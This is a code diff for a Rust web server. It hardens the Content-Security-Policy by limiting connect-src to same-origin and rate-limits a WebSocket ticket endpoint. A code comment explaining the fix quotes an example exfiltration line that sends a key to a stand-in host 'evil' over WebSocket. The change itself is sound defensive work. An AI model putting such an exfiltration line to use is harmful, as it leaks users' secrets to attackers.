@@ -76,10 +76,15 @@ pub async fn security_headers(req: Request, next: Next) -> Response {
         axum::http::header::REFERRER_POLICY,
         HeaderValue::from_static("no-referrer"),
     );
+    // SEC: `connect-src 'self'` covers both same-origin XHR/fetch AND same-
+    // origin WebSocket upgrades (CSP Level 3). The previous `ws: wss:` allowed
+    // any host — making post-XSS exfiltration (e.g. `new WebSocket('ws://evil/'+key)`)
+    // possible despite `script-src 'self'` blocking inline scripts. Same-origin
+    // is the only place the dashboard ever needs to talk.
     headers.insert(
         axum::http::header::CONTENT_SECURITY_POLICY,
         HeaderValue::from_static(
-            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
+            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self' data: blob:; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
         ),
     );
     response
@@ -146,6 +151,10 @@ impl RateLimiter {
             // repeated update downloads (each is a heavy GitHub fetch).
             || path == "/api/admin/update/check"
             || path == "/api/admin/update/apply"
+            // SEC: each ws-ticket issuance writes a fresh entry to
+            // `state.events.ws_tickets`; bucket under SensitiveAdmin so a
+            // bearer-token holder can't burn 200 rpm of ticket issuance.
+            || path == "/api/admin/ws-ticket"
         {
             (BucketKind::SensitiveAdmin, SENSITIVE_ADMIN_RPM)
         } else if path.starts_with("/api/admin/") || path.starts_with("/api/claude-code/") {
